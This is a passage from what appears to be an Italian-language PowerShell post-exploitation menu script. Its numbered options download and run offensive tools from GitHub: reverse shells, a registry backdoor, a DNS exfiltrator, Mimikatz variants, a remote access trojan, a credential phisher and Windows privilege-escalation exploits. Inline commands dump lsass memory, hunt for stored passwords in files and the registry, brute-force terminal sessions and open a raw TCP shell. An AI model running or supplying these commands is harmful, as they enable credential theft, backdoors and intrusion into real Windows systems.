        '395' {Scarica "tokyoneon/Chimera/shells/generic2" "generic2.ps1" "tokyoneon/Chimera/master/shells/generic2.ps1"}
        '396' {Scarica "tokyoneon/Chimera/shells/generic3" "generic3.ps1" "tokyoneon/Chimera/master/shells/generic3.ps1"}
        '397' {Scarica "tokyoneon/Chimera/shells/powershell_reverse_shell" "powershell_reverse_shell.ps1" "tokyoneon/Chimera/master/shells/powershell_reverse_shell.ps1"}
        '398' {Scarica "tokyoneon/Chimera/shells/misc/Add-RegBackdoor" "Add-RegBackdoor.ps1" "tokyoneon/Chimera/master/shells/misc/Add-RegBackdoor.ps1"}
        '399' {Scarica "tokyoneon/Chimera/shells/misc/Get-Information" "Get-Information.ps1" "tokyoneon/Chimera/master/shells/misc/Get-Information.ps1"}
        '400' {Scarica "tokyoneon/Chimera/shells/misc/Invoke-PoshRatHttp" "Invoke-PoshRatHttp.ps1" "tokyoneon/Chimera/master/shells/misc/Invoke-PoshRatHttp.ps1"}
        '401' {Scarica "tokyoneon/Chimera/shells/misc/Invoke-PortScan" "Invoke-PortScan.ps1" "tokyoneon/Chimera/master/shells/misc/Invoke-PortScan.ps1"}
        '402' {Scarica "tokyoneon/Chimera/shells/misc/Get-WLAN-Keys" "Get-WLAN-Keys.ps1" "tokyoneon/Chimera/master/shells/misc/Get-WLAN-Keys.ps1"}
        '403' {Scarica "Arno0x/DNSExfiltrator" "Invoke-DNSExfiltrator.ps1" "Arno0x/DNSExfiltrator/master/Invoke-DNSExfiltrator.ps1"}
        '404' {ScaricaRel "fatedier/frp"}
        '406' {ScaricaSSL "iSECPartners/jailbreak" "jailbreak.zip" "iSECPartners/jailbreak/archive/master.zip"}
        '407' {ScaricaBat "M4ximuss/Powerless" "Powerless.bat" "M4ximuss/Powerless/master/Powerless.bat"}
        '408' {ScaricaRel "antonioCoco/RogueWinRM"}
        '409' {ScaricaSSL "ANSSI-FR/ADTimeline" "ADTimeline.zip" "ANSSI-FR/ADTimeline/archive/master.zip"}
        '410' {Scarica "l0ss/Grouper" "grouper.psm1" "l0ss/Grouper/master/grouper.psm1"}
        '411' {ScaricaRel "l0ss/Grouper2"}
        '412' {ScaricaSSL "p3nt4/PowerShdll" "Powershdll.exe" "p3nt4/PowerShdll/raw/master/exe/bin/Release/Powershdll.exe"; Scarica "p3nt4/PowerShdll" "PowerShdll.exe.config" "p3nt4/PowerShdll/master/exe/bin/Release/PowerShdll.exe.config"}
        '413' {ScaricaRel "jaredhaight/PSAttack"}
        '414' {ScaricaSSL "OmerYa/Invisi-Shell" "InvisiShellProfiler.dll" "OmerYa/Invisi-Shell/raw/master/build/x64/Release/InvisiShellProfiler.dll"}
        '415' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x64/NET3.5" "EvilSalsa_x64.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET3.5/EvilSalsa_x64.dll"}
        '416' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x86/NET3.5" "EvilSalsa_x86.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET3.5/EvilSalsa_x86.dll"}
        '417' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x64/NET4.0" "EvilSalsa_x64.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET4.0/EvilSalsa_x64.dll"}
        '418' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x86/NET4.0" "EvilSalsa_x86.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET4.0/EvilSalsa_x86.dll"}
        '419' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x64/NET4.5" "EvilSalsa_x64.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET4.5/EvilSalsa_x64.dll"}
        '420' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x86/NET4.5" "EvilSalsa_x86.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET4.5/EvilSalsa_x86.dll"}
        '421' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x64/NET3.5" "SalseoLoader_x64.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET3.5/SalseoLoader_x64.exe"}
        '422' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x86/NET3.5" "SalseoLoader_x86.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET3.5/SalseoLoader_x86.exe"}
        '424' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x64/NET4.0" "SalseoLoader_x64.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET4.0/SalseoLoader_x64.exe"}
        '425' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x86/NET4.0" "SalseoLoader_x86.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET4.0/SalseoLoader_x86.exe"}
        '426' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x64/NET4.5" "SalseoLoader_x64.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET4.5/SalseoLoader_x64.exe"}
        '427' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x86/NET4.5" "SalseoLoader_x86.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET4.5/SalseoLoader_x86.exe"}
        '428' {ScaricaSSL "Hackplayers/Salsa-tools/SilentMOD_x64/NET4.5" "SilentMOD_x64.dll" "Hackplayers/Salsa-tools/raw/master/releases/SilentMOD/NET4.5/SilentMOD_x64.dll"}
        '429' {ScaricaSSL "Hackplayers/Salsa-tools/SilentMOD_x86/NET4.5" "SilentMOD_x86.dll" "Hackplayers/Salsa-tools/raw/master/releases/SilentMOD/NET4.5/SilentMOD_x86.dll"}
        '430' {ScaricaSSL "Hackplayers/Salsa-tools/Standalone_x64/NET4.0" "SalseoStandalone_x64.exe" "Hackplayers/Salsa-tools/raw/master/releases/Standalone/NET4.0/SalseoStandalone_x64.exe"}
        '431' {ScaricaSSL "Hackplayers/Salsa-tools/Standalone_x86/NET4.0" "SalseoStandalone_x86.exe" "Hackplayers/Salsa-tools/raw/master/releases/Standalone/NET4.0/SalseoStandalone_x86.exe"}
        '432' {ScaricaSSL "Hackplayers/Salsa-tools/Standalone_x64/NET4.5" "SalseoStandalone_x64.exe" "Hackplayers/Salsa-tools/raw/master/releases/Standalone/NET4.5/SalseoStandalone_x64.exe"}
        '433' {ScaricaSSL "Hackplayers/Salsa-tools/Standalone_x86/NET4.5" "SalseoStandalone_x86.exe" "Hackplayers/Salsa-tools/raw/master/releases/Standalone/NET4.5/SalseoStandalone_x86.exe"}
        '434' {ScaricaSSL "padovah4ck/PSBypassCLM/x64" "PsBypassCLM.exe" "padovah4ck/PSByPassCLM/raw/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe"}
        '435' {ScaricaSSL "itm4n/VBA-RunPE" "VBA-RunPE.zip" "itm4n/VBA-RunPE/archive/master.zip"}
        '436' {ScaricaSSL "cfalta/PowerShellArmoury" "PowerShellArmoury.zip" "cfalta/PowerShellArmoury/archive/master.zip"}
        '437' {ScaricaSSL "mgeeky/Stracciatella" "Stracciatella.exe" "mgeeky/Stracciatella/raw/master/Stracciatella.exe"}
        '438' {ScaricaRel "SnaffCon/Snaffler"}
        '439' {ScaricaRel "vivami/SauronEye"}
        '440' {Scarica "xct/xc/PrivescCheck" "PrivescCheck.ps1" "xct/xc/master/files/powershell/PrivescCheck.ps1"}
        '441' {ScaricaSSL "mubix/post-exploitation" "post-exploitation.zip" "mubix/post-exploitation/archive/master.zip"}
        '442' {ScaricaRel "vletoux/pingcastle"}
        '443' {Scarica "canix1/ADACLScanner" "ADACLScan.ps1" "canix1/ADACLScanner/master/ADACLScan.ps1"}
        '444' {Scarica "fox-it/Invoke-ACLPwn" "Invoke-ACLPwn.ps1" "fox-it/Invoke-ACLPwn/master/Invoke-ACLPwn.ps1"};
        '445' {ScaricaRel "FatRodzianko/Get-RBCD-Threaded"}
        '446' {ScaricaRel "fireeye/SharPersist"}
        '447' {ScaricaSSL "Dviros/Excalibur" "Excalibur.zip" "Dviros/Excalibur/archive/master.zip"}
        '448' {Scarica "arjansturing/smbv1finder" "SMBv1Finder.ps1" "arjansturing/smbv1finder/master/SMBv1Finder.ps1"}
        '449' {ScaricaSSL "VikasSukhija/Downloads/Multi-Tools" "Multi-Tools.zip" "VikasSukhija/Downloads/archive/master.zip"}
        '450' {Scarica "adrianlois/Fingerprinting-envio-FTP-PowerShell/SysInfo" "SysInfo.ps1" "adrianlois/Fingerprinting-envio-FTP-PowerShell/master/SysInfo.ps1"}
        '451' {Scarica "SMATechnologies/winscp-powershell" "Winscp.ps1" "SMATechnologies/winscp-powershell/master/Winscp.ps1"}
        '452' {ScaricaSSL "tonylanglet/crushftp.powershell" "crushftp.zip" "tonylanglet/crushftp.powershell/archive/master.zip"}
        '453' {ScaricaSSL "Mr-Un1k0d3r/SCShell" "SCShell.exe" "Mr-Un1k0d3r/SCShell/raw/master/SCShell.exe"}
        '454' {$search=New-Object DirectoryServices.DirectorySearcher([ADSI]""); $search.filter="(servicePrincipalName=*)"; $results=$search.Findall(); foreach($result in $results){$userEntry=$result.GetDirectoryEntry(); Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"; Write-host "DN      =      "  $userEntry.distinguishedName; Write-host "Object Cat. = "  $userEntry.objectCategory; Write-host "servicePrincipalNames"; $i=1; foreach($SPN in $userEntry.servicePrincipalName){Write-host "SPN(" $i ")   =      " $SPN       $i+=1}Write-host ""}}
        '455' {ScaricaSSL "PowerShellEmpire/PowerTools" "PowerTools.zip" "PowerShellEmpire/PowerTools/archive/master.zip"}
        '456' {Scarica "rem1ndsec/DLLJack" "dlljack.ps1" "rem1ndsec/DLLJack/master/dlljack.ps1"}
        '457' {ScaricaSSL "wietze/windows-dll-hijacking" "windows-dll-hijacking.zip" "wietze/windows-dll-hijacking/archive/master.zip"}
        '458' {ScaricaSSL "Flangvik/DLLSideloader" "DLLSideloader.zip" "Flangvik/DLLSideloader/archive/master.zip"}
        '459' {tasklist; write-host "Digit PID, Process ID"; $TPID=read-host "(example, 6095)"; if($TPID -ne ""){rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump $TPID .\$TPID.bin full}}
        '460' {write-host "Enable or Disable Evasion/Bypassing?"; $EVA=read-host "(example, 1=Enable, 0=Disable)"; if($EVA -ne "1"){$EVA="0"}}
        '461' {Scarica "ShawnDEvans/smbmap/psutils/Get-FileLockProcess" "Get-FileLockProcess.ps1" "ShawnDEvans/smbmap/master/psutils/Get-FileLockProcess.ps1"}
        '462' {ScaricaRel "ElevenPaths/FOCA"}
        '463' {Scarica "mdsecactivebreach/CACTUSTORCH.cna" "CACTUSTORCH.cna" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.cna"}
        '464' {Scarica "mdsecactivebreach/CACTUSTORCH.hta" "CACTUSTORCH.hta" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta"}
        '465' {Scarica "mdsecactivebreach/CACTUSTORCH.js" "CACTUSTORCH.js" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.js"}
        '466' {Scarica "mdsecactivebreach/CACTUSTORCH.jse" "CACTUSTORCH.jse" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.jse"}
        '467' {Scarica "mdsecactivebreach/CACTUSTORCH.vba" "CACTUSTORCH.vba" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.vba"}
        '468' {Scarica "mdsecactivebreach/CACTUSTORCH.vbe" "CACTUSTORCH.vbe" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.vbe"}
        '469' {Scarica "mdsecactivebreach/CACTUSTORCH.vbs" "CACTUSTORCH.vbs" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.vbs"}
        '470' {Scarica "microsoft/CSS-Exchange/Test-ProxyLogon" "Test-ProxyLogon.ps1" "microsoft/CSS-Exchange/main/Security/Test-ProxyLogon.ps1"}
        '471' {ScaricaSSL "S3cur3Th1sSh1t/PowerSharpPack" "PowerSharpPack.zip" "S3cur3Th1sSh1t/PowerSharpPack/archive/master.zip"}
        '472' {ScaricaRel "ctxis/DLLHSC"}
        '474' {ScaricaSSL "TonyPhipps/Meerkat" "Meerkat.zip" "TonyPhipps/Meerkat/archive/master.zip"}
        '475' {ScaricaSSL "k8gege/K8tools/K8PortScan" "K8PortScan.exe" "k8gege/K8tools/raw/master/K8PortScan.exe"}
        '476' {ScaricaRel "Aetsu/OffensivePipeline"}
        '477' {write-host "Digit a tool with extension from https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86"; $BNF=read-host "(example, nmap.exe)"; if($BNF -ne ""){ScaricaSSL "andrew-d/static-binaries/windows/x86/$BNF" "$BNF" "andrew-d/static-binaries/raw/master/binaries/windows/x86/$BNF"}}
        '478' {write-host "Digit a tool with extension from https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x64"; $BNF=read-host "(example, nmap.exe)"; if($BNF -ne ""){ScaricaSSL "andrew-d/static-binaries/windows/x64/$BNF" "$BNF" "andrew-d/static-binaries/raw/master/binaries/windows/x64/$BNF"}}
        '479' {Scarica "p3nt4/Invoke-SocksProxy" "Invoke-SocksProxy.psm1" "p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1"}
        '480' {ScaricaSSL "abatchy17/WindowsExploits" "WindowsExploits.zip" "abatchy17/WindowsExploits/archive/refs/heads/master.zip"}
        '481' {ScaricaSSL "SecWiki/windows-kernel-exploits" "windows-kernel-exploits.zip" "SecWiki/windows-kernel-exploits/archive/refs/heads/master.zip"}
        '482' {cd C:\; findstr /SI /M "password" *.xml *.ini *.txt}
        '483' {cd C:\; findstr /si password *.xml *.ini *.txt *.config}
        '484' {cd C:\; findstr /spin "password" *.*}
        '485' {ScaricaExt "sysinternals.com/files/SysinternalsSuite" "SysinternalsSuite.zip" "https://download.sysinternals.com/files/SysinternalsSuite.zip"}
        '486' {ScaricaExt "sysinternals.com/files/SysinternalsSuite-ARM64" "SysinternalsSuite-ARM64.zip" "https://download.sysinternals.com/files/SysinternalsSuite-ARM64.zip"}
        '487' {ScaricaRel "ohpe/juicy-potato"}
        '488' {sc qc upnphost}
        '489' {ScaricaSSL "phackt/pentest/privesc/accesschk" "accesschk.exe" "phackt/pentest/raw/master/privesc/windows/accesschk.exe"}
        '490' {ScaricaSSL "phackt/pentest/privesc/windows/accesschk64" "accesschk64.exe" "phackt/pentest/raw/master/privesc/windows/accesschk64.exe"}
        '491' {ScaricaSSL "phackt/pentest/privesc/windows/Microsoft.ActiveDirectory.Management" "Microsoft.ActiveDirectory.Management.dll" "phackt/pentest/raw/master/privesc/windows/Microsoft.ActiveDirectory.Management.dll"}
        '492' {Scarica "phackt/pentest/privesc/windows/Set-LHSTokenPrivilege" "Set-LHSTokenPrivilege.ps1" "phackt/pentest/master/privesc/windows/Set-LHSTokenPrivilege.ps1"}
        '493' {ScaricaSSL "phackt/pentest/privesc/windows/nc" "nc.exe" "phackt/pentest/raw/master/privesc/windows/nc.exe"}
        '494' {ScaricaSSL "phackt/pentest/privesc/windows/nc64" "nc64.exe" "phackt/pentest/raw/master/privesc/windows/nc64.exe"}
        '495' {ScaricaBat "phackt/pentest/privesc/windows/privesc" "privesc.bat" "phackt/pentest/master/privesc/windows/privesc.bat"}
        '496' {ScaricaSSL "phackt/pentest/privesc/windows/procdump" "procdump.exe" "phackt/pentest/raw/master/privesc/windows/procdump.exe"}
        '497' {ScaricaSSL "phackt/pentest/privesc/windows/procdump64" "procdump64.exe" "phackt/pentest/raw/master/privesc/windows/procdump64.exe"}
        '498' {ScaricaBat "phackt/pentest/privesc/windows/wmic_info" "wmic_info.bat" "phackt/pentest/master/privesc/windows/wmic_info.bat"}
        '499' {cmd /c 'if exist C:\Windows\System32\bash.exe (echo "C:\Windows\System32\bash.exe exists") else echo "C:\Windows\System32\bash.exe NOT exists"'}
        '500' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/Rubeus" "Rubeus.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe"}
        '501' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SafetyKatz" "SafetyKatz.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SafetyKatz.exe"}
        '502' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/Seatbelt" "Seatbelt.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"}
        '503' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SharpDPAPI" "SharpDPAPI.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDPAPI.exe"}
        '504' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SharpDump" "SharpDump.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDump.exe"}
        '505' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SharpRoast" "SharpRoast.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpRoast.exe"}
        '506' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SharpUp" "SharpUp.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe"}
        '507' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SharpWMI" "SharpWMI.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpWMI.exe"}
        '508' {ScaricaSSL "FSecureLABS/Azurite" "Azurite.zip" "FSecureLABS/Azurite/archive/refs/heads/master.zip"}
        '509' {ScaricaSSL "nccgroup/azucar" "azucar.zip" "nccgroup/azucar/archive/refs/heads/master.zip"}
        '510' {if(Test-Path .\AzureADRecon.ps1){if($Cred -ne $null){.\AzureADRecon.ps1 -Credential $Cred}else{.\AzureADRecon.ps1}}else{Scarica "adrecon/AzureADRecon" "AzureADRecon.ps1" "adrecon/AzureADRecon/master/AzureADRecon.ps1"}}
        '511' {ScaricaRel "skelsec/pypykatz"}
        '512' {Scarica "GetRektBoy724/BetterXencrypt" "betterxencrypt.ps1" "GetRektBoy724/BetterXencrypt/main/betterxencrypt.ps1"}
        '513' {netstat -ano | findstr /i listen}
        '514' {hostname}
        '515' {cmd /c 'reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI /s'}
        '516' {cmd /c 'dir C:\Users /A /Q'}
        '517' {foreach($KEYWD in $KEYWRDS){findstr /S $KEYWD C:\Users\*}}
        '518' {reg query HKLM /f password /t REG_SZ /s /reg:64; reg query HKCU /f password /t REG_SZ /s /reg:64; reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /reg:64; foreach($XFL in (get-childitem -ErrorAction 'silentlycontinue' -recurse ($env:windir)*.xml).name){get-content $XFL}}
        '519' {REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit}
        '520' {REG QUERY HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager}
        '521' {REG QUERY "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled}
        '522' {REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA}
        '523' {WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more}
        '524' {schtasks /query /FO LIST /V}
        '525' {get-content C:\WINDOWS\System32\drivers\etc\hosts | findstr /v "^#"}
        '526' {ipconfig /displaydns | findstr "Record" | findstr "Name Host"}
        '527' {ipconfig /all}
        '528' {arp -a}
        '529' {route PRINT}
        '530' {netstat -p TCP}
        '531' {netstat -p UDP}
        '532' {netsh firewall show state; netsh firewall show config; netsh dump}
        '533' {net start}
        '534' {sc query; sc query state=all}
        '535' {driverquery /V}
        '536' {wmic service list brief; wmic service list config; wmic process; wmic service; wmic USERACCOUNT; wmic group list full; wmic nicconfig where IPenable='true'; wmic volume; wmic netuse list full; wmic qfe; wmic startup; wmic PRODUCT; wmic OS; wmic Timezone}
        '537' {cmd /c 'dir /B /S C:\*mdb'}
        '538' {dir /A C:\inetpub\wwwroot\}
        '539' {Scarica "jschicht/ExtractUsnJrnl/ExtractUsnJrnl.au3" "ExtractUsnJrnl.au3" "jschicht/ExtractUsnJrnl/master/ExtractUsnJrnl.au3"}
        '540' {ScaricaSSL "jschicht/ExtractUsnJrnl/ExtractUsnJrnl.exe" "ExtractUsnJrnl.exe" "jschicht/ExtractUsnJrnl/raw/master/ExtractUsnJrnl.exe"}
        '541' {ScaricaSSL "jschicht/ExtractUsnJrnl/ExtractUsnJrnl64.exe" "ExtractUsnJrnl64.exe" "jschicht/ExtractUsnJrnl/raw/master/ExtractUsnJrnl64.exe"}
        '542' {ScaricaSSL "Ascotbe/Kernelhub" "Kernelhub.zip" "Ascotbe/Kernelhub/archive/refs/heads/master.zip"}
        '543' {ScaricaRel "danigargu/CVE-2020-0796"}
        '544' {ScaricaSSL "ZephrFish/CVE-2020-1350" "CVE-2020-1350.exe" "ZephrFish/CVE-2020-1350/raw/master/CVE-2020-1350.exe"; ScaricaSSL "ZephrFish/CVE-2020-1350/PoC" "PoC.exe" "ZephrFish/CVE-2020-1350/raw/master/PoC.exe"; Scarica "ZephrFish/CVE-2020-1350" "windows-exploit.ps1" "ZephrFish/CVE-2020-1350/master/windows-exploit.ps1"}
        '545' {ScaricaSSL "unamer/CVE-2018-8120/x86" "CVE-2018-8120-x86.exe" "unamer/CVE-2018-8120/raw/master/Release/CVE-2018-8120.exe"}
        '546' {ScaricaSSL "unamer/CVE-2018-8120/x64" "CVE-2018-8120-x64.exe" "unamer/CVE-2018-8120/raw/master/x64/Release/CVE-2018-8120.exe"}
        '547' {ScaricaRel "cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION"}
        '548' {Scarica "itm4n/CVEs/CVE-2020-1170" "DefenderArbitraryFileDelete.ps1" "itm4n/CVEs/master/CVE-2020-1170/DefenderArbitraryFileDelete.ps1"}
        '549' {ScaricaSSL "nu11secur1ty/Windows10Exploits" "Windows10Exploits.zip" "nu11secur1ty/Windows10Exploits/archive/refs/heads/master.zip"}
        '550' {Scarica "cert-lv/exchange_webshell_detection" "detect_webshells.ps1" "cert-lv/exchange_webshell_detection/main/detect_webshells.ps1"}
        '551' {ScaricSSL "ZhuriLab/Exploits" "Exploits.zip" "ZhuriLab/Exploits/archive/refs/heads/master.zip"}
        '552' {ScaricaSSL "padovah4ck/CVE-2020-0683/MsiExploit" "MsiExploit.exe" "padovah4ck/CVE-2020-0683/raw/master/bin_MsiExploit/MsiExploit.exe"; ScaricaSSL "padovah4ck/CVE-2020-0683/foo" "foo.msi" "padovah4ck/CVE-2020-0683/raw/master/bin_MsiExploit/foo.msi"}
        '553' {ScaricaSSL "afang5472/CVE-2020-0753-and-CVE-2020-0754" "CVE-2020-0753-and-CVE-2020-0754.zip" "afang5472/CVE-2020-0753-and-CVE-2020-0754/archive/refs/heads/master.zip"}
        '554' {ScaricaSSL "goichot/CVE-2020-3435" "CVE-2020-3435-profile-modification.exe" "goichot/CVE-2020-3433/raw/master/bin/CVE-2020-3435-profile-modification.exe"}
        '555' {ScaricaSSL "goichot/CVE-2020-3434" "CVE-2020-3434-DoS.exe" "goichot/CVE-2020-3433/raw/master/bin/CVE-2020-3434-DoS.exe"}
        '556' {ScaricaSSL "goichot/CVE-2020-3433" "CVE-2020-3433-privesc.exe" "goichot/CVE-2020-3433/raw/master/bin/CVE-2020-3433-privesc.exe"}
        '557' {ScaricaSSL "ANSSI-FR/DFIR-O365RC" "DFIR-O365RC.zip" "ANSSI-FR/DFIR-O365RC/archive/refs/heads/main.zip"}
        '558' {ScaricaRel "antonioCoco/RemotePotato0"}
        '559' {ScaricaRel "wdelmas/remote-potato"}
        '560' {ScaricaSSL "exploitblizzard/Windows-Privilege-Escalation-CVE-2021-1732" "Windows-Privilege-Escalation-CVE-2021-1732.zip" "exploitblizzard/Windows-Privilege-Escalation-CVE-2021-1732/archive/refs/heads/main.zip"}
        '561' {if(Test-Path "C:\Windows\System32\tscon.exe"){if(Test-Path "C:\Windows\System32\query.exe"){query user; $TSID=read-host "Digit a session ID"; if($TSID -ne ""){foreach($TENT in get-content $FILE){tscon /password:$TENT}}}}}
        '562' {ScaricaSSL "mdiazcl/fuzzbunch-debian" "fuzzbunch-debian.zip" "mdiazcl/fuzzbunch-debian/archive/refs/heads/master.zip"}
        '563' {ScaricaRel "med0x2e/GadgetToJScript"}
        '564' {ScaricaSSL "lawrenceamer/TChopper" "chopper.exe" "lawrenceamer/TChopper/raw/main/release/chopper.exe"}
        '565' {ScaricaSSL "r00t-3xp10it/redpill" "redpill.zip" "r00t-3xp10it/redpill/archive/refs/heads/main.zip"}
        '566' {Scarica "S3cur3Th1sSh1t/NamedPipePTH/Invoke-ImpersonateUser-PTH" "Invoke-ImpersonateUser-PTH.ps1" "S3cur3Th1sSh1t/NamedPipePTH/main/Invoke-ImpersonateUser-PTH.ps1"}
        '567' {ScaricaRel "BSI-Bund/RdpCacheStitcher"}
        '568' {ScaricaRel "qwqdanchun/DcRat"}
        '569' {ScaricaSSL "hashtopolis/agent-csharp/hashtopolis" "hashtopolis.exe" "hashtopolis/agent-csharp/raw/master/hashtopolis/binary/hashtopolis.exe"}
        '570' {rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 688 .\lsass.dmp full}
        '571' {ScaricaRel "0xDivyanshu/Injector"}
        '572' {ScaricaSSL "GossiTheDog/HiveNightmare" "HiveNightmare.exe" "GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe"}
        '573' {ScaricaSSL "OpenSecurityResearch/dllinjector-x64" "dllInjector-x64.exe" "OpenSecurityResearch/dllinjector/raw/master/Release/dllInjector-x64.exe"; ScaricaSSL "OpenSecurityResearch/dllinjector-x64" "dllInjector-x64.pdb" "OpenSecurityResearch/dllinjector/raw/master/Release/dllInjector-x64.pdb"; ScaricaSSL "OpenSecurityResearch/dllinjector-x64" "reflective_dll.x64.dll" "OpenSecurityResearch/dllinjector/raw/master/Release/reflective_dll.x64.dll"}
        '574' {ScaricaSSL "OpenSecurityResearch/dllinjector-x86" "dllInjector-x86.exe" "OpenSecurityResearch/dllinjector/raw/master/Release/dllInjector-x86.exe"; ScaricaSSL "OpenSecurityResearch/dllinjector-x86" "dllInjector-x86.pdb" "OpenSecurityResearch/dllinjector/raw/master/Release/dllInjector-x86.pdb"; ScaricaSSL "OpenSecurityResearch/dllinjector-x86" "reflective_dll.dll" "OpenSecurityResearch/dllinjector/raw/master/Release/reflective_dll.dll"}
        '575' {ScaricaRel "Yaxser/Backstab"}
        '576' {ScaricaSSL "topotam/PetitPotam" "PetitPotam.exe" "topotam/PetitPotam/raw/main/PetitPotam.exe"}
        '577' {Scarica "tokyoneon/CredPhish" "credphish.ps1" "tokyoneon/CredPhish/master/credphish.ps1"}
        '578' {ScaricaRel "merbanan/rtl_433"}
        '579' {write-host "Digit the target Domain"; $DOM=read-host "(example, google.com)"; foreach($ELE in "UNKNOWN", "A_AAAA", "A", "AAAA", "NS", "MX", "MD", "MF", "CNAME", "SOA", "MB", "MG", "MR", "NULL", "WKS", "PTR", "HINFO", "MINFO", "TXT", "RP", "AFSDB", "X25", "ISDN", "RT", "SRV", "DNAME", "OPT", "DS", "RRSIG", "NSEC", "DNSKEY", "DHCID", "NSEC3", "NSEC3PARAM", "ANY", "ALL"){Resolve-DnsName -Name $DOM -Type $ELE}}
        '580' {ScaricaRel "swisskyrepo/SharpLAPS"}
        '581' {sc queryex termservice}
        '582' {ScaricaSSL "DarkCoderSc/run-as-attached-networked/Win32" "RunAsAttachedNet.exe" "DarkCoderSc/run-as-attached-networked/raw/master/Win32/Release/RunAsAttachedNet.exe"}
        '583' {ScaricaSSL "DarkCoderSc/run-as-attached-networked/Win64" "RunAsAttachedNet.exe" "DarkCoderSc/run-as-attached-networked/raw/master/Win64/Release/RunAsAttachedNet.exe"}
        '584' {ScaricaRel "bats3c/ADCSPwn"}
        '585' {ScaricaRel "ivan-sincek/invoker"}
        '586' {ScaricaRel "skelsec/jackdaw"}
        '587' {write-host "Digit a Target IP"; $TIP=read-host "(example, 192.168.168.3)"; if($TIP -ne ""){write-host "Digit a Target PORT"; $TPRT=read-host "(example, 135)"; if($TPRT -ne ""){$TCPC=New-Object System.Net.Sockets.TcpClient($TIP, $TPRT); $TCPS=$TCPC.GetStream(); $TCPR=New-Object System.IO.StreamReader($TCPS); $TCPW=New-Object System.IO.StreamWriter($TCPS); $TCPW.Flush(); while($TCPC.Connected){while($TCPS.DataAvailable){$TCPR.ReadLine();} $CMD=read-host ">"; if($CMD -eq "logout"){break} $TCPW.WriteLine($CMD) | Out-Null;}$TCPW.Close();$TCPR.Close();$TCPC.Close();}}}
